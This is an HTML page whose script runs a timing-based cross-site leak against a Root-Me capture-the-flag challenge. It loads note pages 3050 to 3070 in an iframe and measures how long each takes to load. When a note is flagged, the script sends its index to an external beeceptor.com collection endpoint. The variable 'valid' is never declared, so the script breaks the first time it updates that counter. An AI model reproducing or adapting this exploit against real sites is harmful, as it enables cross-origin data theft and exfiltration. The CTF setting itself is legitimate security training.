<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Load URLs in Iframe</title>
    <style>
        iframe {
            width: 100%;
            height: 600px;
            border: 1px solid #ccc;
        }

        #status {
            margin-top: 20px;
            font-size: 16px;
        }
    </style>
</head>
<body>

    <h1>Loading URLs in Iframe</h1>
    <div id="status">Starting to load...</div>
    <iframe id="iframe"></iframe>
    <pre id="log"></pre> <!-- Display loading times -->

    <script>
        const start = 3050;
        const end = 3070;
        const iframe = document.getElementById('iframe');
        const status = document.getElementById('status');
        const logElement = document.getElementById('log');

        function loadUrl(url) {
            iframe.src = url;
        }

        function loadNextNote(currentIndex) {
            if (currentIndex > end) {
                status.textContent = "Finished loading all notes.";
                return;
            }

            const url = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${currentIndex}`;
            status.textContent = `Loading: ${url}`;

            const startTime = performance.now(); // Start timing
            loadUrl(url);

            iframe.onerror = function() {
                console.log("error");
            }

            iframe.onload = function () {
                const endTime = performance.now(); // End timing
                const loadTime = Math.round(endTime - startTime); // Calculate duration

                if (loadTime > 90) {
                    valid += 1;
                } else {
                    valid = 0;
                }

                setTimeout(() => {
                    if (valid < 4 && loadTime > 90) {
                        loadNextNote(currentIndex);
                    } else if (valid >= 4) {
                        fetch("https://rootmexsleak.free.beeceptor.com/" + currentIndex); // Append to log
                    } else {
                        loadNextNote(currentIndex + 1);
                    }
                }, 10);
            };
        }

        loadNextNote(start);
    </script>

</body>
</html>
